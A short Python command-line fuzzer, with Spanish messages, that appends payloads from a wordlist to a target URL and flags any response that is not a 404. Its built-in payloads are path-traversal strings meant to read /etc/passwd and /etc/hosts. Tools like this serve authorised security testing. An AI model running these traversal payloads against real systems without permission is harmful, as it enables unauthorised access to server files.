import argparse
import requests

def fuzz(url, payloads):
    for payload in payloads:
        test_url = url + payload
        try:
            response = requests.get(test_url)
            if response.status_code != 404:
                print(f"Payload exitoso: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"Error al enviar solicitud: {e}")

def cargar_wordlist(archivo):
    with open(archivo, 'r') as f:
        return [line.strip() for line in f.readlines()]

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Fuzzing tool para probar URLs con payloads")
    parser.add_argument("target_url", help="URL objetivo")
    parser.add_argument("-w", "--wordlist", help="Ruta de la wordlist")
    args = parser.parse_args()

    target_url = args.target_url
    if args.wordlist:
        wordlist_file = args.wordlist
        payloads = cargar_wordlist(wordlist_file)
    else:
        payloads = [
            "/../../",
            "/../../../",
            "/../../../../etc/passwd",
            "/../../../../../etc/passwd",
            "/../../../../../etc/hosts",
            # Agrega más payloads según tus necesidades
        ]

    fuzz(target_url, payloads)
